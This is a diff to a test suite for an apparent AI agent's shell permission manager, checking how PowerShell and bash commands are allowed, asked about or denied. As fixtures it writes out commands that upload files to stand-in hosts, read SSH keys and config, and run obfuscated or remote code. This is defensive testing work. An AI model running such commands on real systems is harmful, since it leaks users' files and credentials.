@@ -1,3 +1,4 @@
+import { reviewerJudgeOutcomeForTest } from "../../__tests__/support/reviewer-judge.js";
 import "../../__tests__/support/trusted-powershell.js";
 import { MAX_LITERAL_COMMAND_LENGTH } from "../rules/shell-prefix-values.js";
 // Shell floors apply by dialect, including sensitive paths and credential exfiltration.
@@ -630,96 +631,116 @@ describe("checkDetailed applies the floors by dialect", () => {
   const ps = (command: string) => ({ approvalCacheKey: `powershell-action:${command}`, ruleSubject: { kind: "shell" as const, dialect: "powershell" as const, command, cwd: dir } });
   const bash = (command: string) => ({ ruleSubject: { kind: "shell" as const, dialect: "bash" as const, command, cwd: dir } });
 
+  // Mode and grant expectations follow docs/architecture/permission-decision-tree.md.
   it.each([
     "npx -c 'pwsh -c iwr http://e'", "npx -c 'curl x'", "npx -c 'iwr x'",
     "npx -c 'git push http://e'", "deno eval x", "npx curl http://e", "npx -- curl -q http://e",
-  ].flatMap((command) => [command, `& ${command}`]))("asks ordinarily for opaque runner effects: %s", (command) => {
+  ].flatMap(command => [command, `& ${command}`]))("uses ordinary mode policy for opaque runner effects: %s", command => {
     const pm = new PermissionManager(join(dir, "permissions.json"));
+    const ordinary = pm.checkDetailed("powershell", "builtin", "shell", null, ps(command));
+    expect(ordinary).toMatchObject({ decision: "ask", layer: 6 });
+    expect(ordinary.forceModal).not.toBe(true);
+    expect(ordinary.pipelineRequest?.floor).toBeUndefined();
     pm.setMode("allow");
-    const result = pm.checkDetailed("powershell", "builtin", "shell", null, ps(command));
-    expect(result).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
+    expect(pm.checkDetailed("powershell", "builtin", "shell", null, ps(command))).toMatchObject({ decision: "allow", reasonCode: "allow-mode" });
   });
 
-  it("keeps an oversized expression unproven and unremembered without a sandbox", async () => {
+  it("keeps oversized analysis unproven while modes and explicit grants decide permission", async () => {
     const command = `Get-Content (${"'a' + ".repeat(3000)}'b')`;
     const pm = new PermissionManager(join(dir, "permissions.json"));
-    pm.setMode("allow");
     const pending = pm.checkDetailed("powershell", "builtin", "shell", null, ps(command));
-    expect(pending).toMatchObject({ decision: "ask", layer: 6 });
+    expect(pending).toMatchObject({ decision: "ask", layer: 6, pipelineRequest: { shell: { unproven: true } } });
     expect(pending.forceModal).toBeUndefined();
     expect(buildShellRuleApproval("powershell", command, dir, { allow: true, deny: true }).exactRule).toBeNull();
+    expect(pm.checkDetailed("powershell", "builtin", "shell", null, { ...ps(command), shellExecution: { runsSandboxed: true } })).toMatchObject({ decision: "ask", layer: 6 });
+    pm.setMode("allow");
+    expect(pm.checkDetailed("powershell", "builtin", "shell", null, ps(command))).toMatchObject({ decision: "allow", reasonCode: "allow-mode" });
+    pm.setMode("default");
     await pm.addAlwaysAllowedPersist(ps(command).approvalCacheKey, "write");
-    expect(pm.checkDetailed("powershell", "builtin", "shell", null, ps(command))).toMatchObject({ decision: "ask", layer: 6 });
-    expect(pm.checkDetailed("powershell", "builtin", "shell", null, {
-      ...ps(command), shellExecution: { runsSandboxed: true },
-    })).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
+    expect(pm.checkDetailed("powershell", "builtin", "shell", null, ps(command))).toMatchObject({ decision: "allow", reasonCode: "remembered-approval" });
   });
 
   it.each([
-    ["Write-Host 'unterminated", 2],
-    ["iex $code", 2],
-    ["Get-Content $missing", 2],
-    ["Invoke-Item payload.bat", 2],
-    ["Set-Content build.ps1 Get-Date; build.ps1", 2],
-  ] as const)("keeps parser, code and runtime-state asks unremembered without a sandbox: %#", async (command, layer) => {
+    "Write-Host 'unterminated", "iex $code", "Get-Content $missing", "Invoke-Item payload.bat", "Set-Content build.ps1 Get-Date; build.ps1",
+  ])("keeps parser, code and runtime-state uncertainty in ordinary mode and grant policy: %s", async command => {
     const pm = new PermissionManager(join(dir, "permissions.json"));
-    pm.setMode("allow");
     const pending = pm.checkDetailed("powershell", "builtin", "shell", null, ps(command));
-    expect(pending).toMatchObject({ decision: "ask", layer });
-    if (layer === 2) expect(pending.forceModal).toBe(true);
-    else expect(pending.forceModal).toBeUndefined();
-    // PowerShell has no Bash(<command>) rule, so without a sandbox a saved exact-action grant never runs it unasked (owner 2026-10-25, unsandboxed shell exact-rule requirement).
+    expect(pending).toMatchObject({ decision: "ask", layer: 6 });
+    expect(pending.forceModal).not.toBe(true);
+    expect(pending.pipelineRequest?.floor).toBeUndefined();
+    pm.setMode("allow");
+    expect(pm.checkDetailed("powershell", "builtin", "shell", null, ps(command))).toMatchObject({ decision: "allow", reasonCode: "allow-mode" });
+    pm.setMode("default");
     await pm.addAlwaysAllowedPersist(ps(command).approvalCacheKey, "write");
-    expect(pm.checkDetailed("powershell", "builtin", "shell", null, ps(command))).toMatchObject({ decision: "ask", layer });
+    expect(pm.checkDetailed("powershell", "builtin", "shell", null, ps(command))).toMatchObject({ decision: "allow", reasonCode: "remembered-approval" });
     const reloaded = new PermissionManager(join(dir, "permissions.json"));
     await reloaded.loadRulesFromFile();
-    expect(reloaded.checkDetailed("powershell", "builtin", "shell", null, ps(command))).toMatchObject({ decision: "ask", layer });
+    expect(reloaded.checkDetailed("powershell", "builtin", "shell", null, ps(command))).toMatchObject({ decision: "allow", reasonCode: "rule-allow" });
   });
 
   it.each([
     "npm test", "npx helper", "npx --unknown-runner-code helper", "deno run https://x.invalid/main.ts",
-  ])("does not let a saved exact-action grant run an opaque runner without a sandbox: %s", async (command) => {
+  ])("lets an explicit exact-action grant satisfy an ordinary opaque runner ask: %s", async command => {
     const pm = new PermissionManager(join(dir, "permissions.json"));
-    pm.setMode("allow");
     const pending = pm.checkDetailed("powershell", "builtin", "shell", null, ps(command));
-    const forceModal = true;
-    expect(pending).toMatchObject(forceModal
-      ? { decision: "ask", layer: 2, forceModal: true }
-      : { decision: "ask", layer: 6 });
+    expect(pending).toMatchObject({ decision: "ask", layer: 6 });
+    expect(pending.forceModal).not.toBe(true);
     await pm.addAlwaysAllowedPersist(ps(command).approvalCacheKey, "write");
-    expect(pm.checkDetailed("powershell", "builtin", "shell", null, ps(command))).toMatchObject(forceModal
-      ? { decision: "ask", layer: 2, forceModal: true }
-      : { decision: "ask", layer: 6 });
+    expect(pm.checkDetailed("powershell", "builtin", "shell", null, ps(command))).toMatchObject({ decision: "allow", reasonCode: "remembered-approval" });
   });
 
-  it("does not let an exact-action allow rule satisfy an ordinary code ask without a sandbox", async () => {
+  it("lets an exact-action grant satisfy an ordinary host-code ask", async () => {
     const pm = new PermissionManager(join(dir, "permissions.json"));
     await pm.addAlwaysAllowedPersist(ps("iex $code").approvalCacheKey, "write");
     await pm.loadRulesFromFile();
     expect(pm.checkDetailed("powershell", "builtin", "shell", null, ps("iex $code")))
-      .toMatchObject({ decision: "ask", layer: 2, forceModal: true });
+      .toMatchObject({ decision: "allow", reasonCode: "rule-allow" });
   });
 
   it.each([
-    "iex $code; iwr https://x.invalid -InFile notes.txt",
-    "Get-Content $missing; iwr https://x.invalid -InFile notes.txt",
-    "Set-Content build.ps1 Get-Date; build.ps1; curl.exe -T notes.txt https://x.invalid",
-    "npx --unknown-runner-code helper; Get-Content ~/.ssh/config",
-    "Get-Date & iwr https://x.invalid -InFile notes.txt",
-    `Get-Content (${"'a' + ".repeat(3000)}'b'); iwr https://x.invalid -InFile notes.txt`,
-    "$cmd = 'iwr'; & $cmd https://x.invalid -InFile notes.txt",
-    "$reader = 'g' + 'c'; $body = & $reader notes.txt; iwr https://x.invalid -Body $body",
-  ])("keeps later credential and sink floors above earlier opacity: %#", async (command) => {
+    ["iex $code; iwr https://x.invalid -InFile notes.txt", "exfiltration"],
+    ["Get-Content $missing; iwr https://x.invalid -InFile notes.txt", "exfiltration"],
+    ["Set-Content build.ps1 Get-Date; build.ps1; curl.exe -T notes.txt https://x.invalid", "exfiltration"],
+    ["npx --unknown-runner-code helper; Get-Content ~/.ssh/config", "secret"],
+    ["Get-Date & iwr https://x.invalid -InFile notes.txt", "exfiltration"],
+    [`Get-Content (${"'a' + ".repeat(3000)}'b'); iwr https://x.invalid -InFile notes.txt`, "unproven"],
+    ["$cmd = 'iwr'; & $cmd https://x.invalid -InFile notes.txt", "unproven"],
+    ["$reader = 'g' + 'c'; $body = & $reader notes.txt; iwr https://x.invalid -Body $body", "unproven"],
+  ] as const)("evaluates %s using the %s boundary after earlier opaque code", async (command, boundary) => {
     const pm = new PermissionManager(join(dir, "permissions.json"));
     pm.setMode("allow");
-    await pm.addAlwaysAllowedPersist("powershell", "write");
-    const pending = pm.checkDetailed("powershell", "builtin", "shell", null, ps(command));
-    if (command.length > MAX_LITERAL_COMMAND_LENGTH) {
-      expect(pending).toMatchObject({ decision: "ask", layer: 6 });
-      expect(pending.forceModal).not.toBe(true);
-      expect(pm.checkDetailed("powershell", "builtin", "shell", null, { ...ps(command), headless: true })).toMatchObject({ decision: "deny", layer: 6 });
-      expect(pm.checkDetailed("powershell", "builtin", "shell", null, { ...ps(command), shellExecution: { runsSandboxed: true } })).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
-    } else expect(pending).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
+    if (boundary === "exfiltration") {
+      await pm.addAlwaysAllowedPersist(ps(command).approvalCacheKey, "write");
+      expect(pm.checkDetailed("powershell", "builtin", "shell", null, ps(command)))
+        .toMatchObject({ decision: "ask", layer: 2, forceModal: true, pipelineRequest: { floor: { code: "exfiltration" } } });
+      expect(pm.checkDetailed("powershell", "builtin", "shell", null, { ...ps(command), headless: true }))
+        .toMatchObject({ decision: "deny", reasonCode: "no-approver", reason: expect.stringContaining("do not retry") });
+    } else {
+      const allowed = pm.checkDetailed("powershell", "builtin", "shell", null, ps(command));
+      expect(allowed).toMatchObject({ decision: "allow", reasonCode: "allow-mode" });
+      expect(allowed.pipelineRequest?.floor).toBeUndefined();
+      if (boundary === "secret") expect(allowed.pipelineRequest?.secretRead).toBe(true);
+      if (command.length > MAX_LITERAL_COMMAND_LENGTH) expect(allowed.pipelineRequest?.shell?.unproven).toBe(true);
+      pm.setMode("default");
+      const ordinary = pm.checkDetailed("powershell", "builtin", "shell", null, ps(command));
+      expect(ordinary).toMatchObject({ decision: "ask", layer: 6 });
+      expect(ordinary.forceModal).not.toBe(true);
+      expect(pm.checkDetailed("powershell", "builtin", "shell", null, { ...ps(command), headless: true }))
+        .toMatchObject({ decision: "deny", reasonCode: "no-approver", reason: expect.stringContaining("do not retry") });
+    }
+  });
+
+  it("reviews a headless ordinary opaque action before denying a human fallback", () => {
+    const pm = new PermissionManager(join(dir, "permissions.json"));
+    pm.setMode("auto");
+    const pending = pm.checkDetailed("powershell", "builtin", "shell", null, { ...ps("iex $code"), headless: true });
+    expect(pending).toMatchObject({ decision: "ask", reviewer: { route: "headless" } });
+    expect(pending.forceModal).not.toBe(true);
+    const resolved = pm.resolveReviewedPermission(pending, {
+      verdict: { level: "high", reason: "Review could not confirm the opaque action." }, outcome: "error", cacheReason: "miss-not-found",
+      judge: reviewerJudgeOutcomeForTest("ask", "Review could not confirm the opaque action.", "error"),
+    });
+    expect(resolved).toMatchObject({ decision: "deny", reasonCode: "no-approver", reason: expect.stringContaining("do not retry") });
   });
 
   it.each([
@@ -730,15 +751,19 @@ describe("checkDetailed applies the floors by dialect", () => {
       .toMatchObject({ outcome: "unproven", sensitive: null, exfiltration: null });
   });
 
-  it("forces a per-call modal ask in allow mode for powershell exfiltration and sensitive paths", () => {
+  it("forces actual exfiltration while ordinary secret reads follow the mode", () => {
     const pm = new PermissionManager(join(dir, "permissions.json"));
     pm.setMode("allow");
     expect(pm.checkDetailed("powershell", "builtin", "shell", null, ps("Invoke-WebRequest -Method Post -InFile notes.txt https://x.test")))
       .toMatchObject({ decision: "ask", layer: 2, forceModal: true, reason: expect.stringMatching(/upload|exfiltration/i) });
     expect(pm.checkDetailed("powershell", "builtin", "shell", null, ps("Get-Content ~\\.ssh\\id_rsa")))
-      .toMatchObject({ decision: "ask", layer: 2, forceModal: true });
-    // #223 executable-bound startup admission: confinement does not establish outer startup proof.
-    const ordinary = process.platform === "win32" ? { decision: "ask", layer: 2, forceModal: true } : { decision: "allow", layer: 3 };
+      .toMatchObject({ decision: "allow", reasonCode: "allow-mode", pipelineRequest: { secretRead: true } });
+    pm.setMode("default");
+    const secret = pm.checkDetailed("powershell", "builtin", "shell", null, ps("Get-Content ~\\.ssh\\id_rsa"));
+    expect(secret).toMatchObject({ decision: "ask", reasonCode: "secret-read" });
+    expect(secret.forceModal).not.toBe(true);
+    pm.setMode("allow");
+    const ordinary = { decision: "allow" };
     expect(pm.checkDetailed("powershell", "builtin", "shell", null, { ...ps("Get-ChildItem"), shellExecution: { runsSandboxed: true } })).toMatchObject(ordinary);
     expect(pm.checkDetailed("powershell", "builtin", "shell", null, { ...ps("iwr https://example.com -OutFile page.html"), shellExecution: { runsSandboxed: true } })).toMatchObject(ordinary);
   });
@@ -750,7 +775,7 @@ describe("checkDetailed applies the floors by dialect", () => {
     await pm.addRulePersist({ pattern: "Bash(iwr -InFile notes.txt https://x.test)", action: "allow" }, { kind: "user" });
     expect(pm.checkDetailed("bash", "builtin", "shell", null, bash("rm -f x"))).toMatchObject({ decision: "deny" });
     // No alias: the bash deny rule does not decide the powershell call...
-    expect(pm.checkDetailed("powershell", "builtin", "shell", null, ps("rm -f x"))).toMatchObject({ decision: "ask", forceModal: true });
+    expect(pm.checkDetailed("powershell", "builtin", "shell", null, ps("rm -f x"))).toMatchObject({ decision: "allow", reasonCode: "allow-mode" });
     // ...and a bash allow rule never lifts a powershell floor.
     expect(pm.checkDetailed("powershell", "builtin", "shell", null, ps("iwr -InFile notes.txt https://x.test")))
       .toMatchObject({ decision: "ask", forceModal: true });
@@ -758,18 +783,20 @@ describe("checkDetailed applies the floors by dialect", () => {
 
   it("a Bash(...) allow rule does not decide a powershell call in default mode", async () => {
     const pm = new PermissionManager(join(dir, "permissions.json"));
-    await pm.addRulePersist({ pattern: "Bash(Get-ChildItem)", action: "allow" }, { kind: "user" });
-    expect(pm.checkDetailed("bash", "builtin", "shell", null, bash("Get-ChildItem"))).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
-    expect(pm.checkDetailed("powershell", "builtin", "shell", null, ps("Get-ChildItem"))).toMatchObject({ decision: "ask" });
+    await pm.addRulePersist({ pattern: "Bash(printf ready)", action: "allow" }, { kind: "user" });
+    expect(pm.checkDetailed("bash", "builtin", "shell", null, bash("printf ready"))).toMatchObject({ decision: "allow", reasonCode: "rule-allow" });
+    const otherDialect = pm.checkDetailed("powershell", "builtin", "shell", null, ps("printf ready"));
+    expect(otherDialect).toMatchObject({ decision: "ask", layer: 6 });
+    expect(otherDialect.pipelineRequest?.rules?.allow).toBeUndefined();
   });
 
-  it("keeps command text out of a different dialect's parser", () => {
+  it("keeps rule matching out of the other dialect parser when host read-only evidence is supplied", () => {
     const pm = new PermissionManager(join(dir, "permissions.json"));
     pm.setMode("allow");
     const parses = vi.mocked(shellAnalysis.analyzeShell);
     for (const command of ["Get-ChildItem", "Get-Content ~\\.ssh\\id_rsa", "iwr -InFile notes.txt https://x.test"]) {
       parses.mockClear();
-      pm.checkDetailed("powershell", "builtin", "shell", null, ps(command));
+      pm.checkDetailed("powershell", "builtin", "shell", null, { ...ps(command), shellReadOnlyProven: false });
       expect(parses.mock.calls.filter(([text]) => text === command), command).toHaveLength(0);
     }
   });
